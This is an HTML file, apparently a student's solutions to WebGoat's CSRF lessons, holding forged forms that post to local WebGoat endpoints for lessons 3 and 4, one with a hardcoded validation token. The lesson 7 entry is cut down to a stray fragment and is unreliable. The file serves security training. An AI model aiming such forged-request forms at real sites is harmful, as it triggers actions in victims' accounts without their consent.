    <h1>lesson 3: Answer: Skript zum Lösen der Aufgabe</h1>
    <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">

        <input type="type" name="inp" id="inp" value="false">
        <input type="submit">
    </form>

    <h1>lesson 4: Answer: Skript zum Lösen der Aufgabe</h1>
    <form action="http://localhost:8080/WebGoat/csrf/review" method="POST">

        <input type="text" name="validateReq" id="inp" value="2aa14227b9a13d0bede0388a7fba9aa9">

        <input type="text" name="reviewText" id="inp" value="">
        <label for="stars">Give a star rating</label>
        <input type="text" name="stars" id="inp" value="">
        <input type="submit">
    </form>

    <h1>lesson 7: Answer: Skript zum lösen der Aufgabe</h1>

            value='"}'>
